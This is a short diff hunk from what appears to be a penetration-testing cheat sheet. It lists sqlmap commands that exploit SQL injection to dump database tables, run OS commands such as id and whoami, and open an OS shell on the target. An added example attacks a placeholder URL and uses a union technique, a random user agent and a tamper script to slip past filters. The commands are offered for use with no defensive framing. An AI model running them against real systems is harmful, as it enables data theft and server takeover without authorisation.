@@ -371,3 +371,6 @@ sqlmap -r tmp --force-ssl --batch -D <database> -T <table> --dump
 sqlmap -r tmp --force-ssl --batch --os-cmd id
 sqlmap -r tmp --force-ssl --batch --os-cmd whoami
 sqlmap -r tmp --force-ssl --batch --os-shell
+
+Example 2
+sqlmap -u "http://target.com/page.php?id=1" --technique=U --dbms=mysql --threads=10 --random-agent --tamper=space2comment
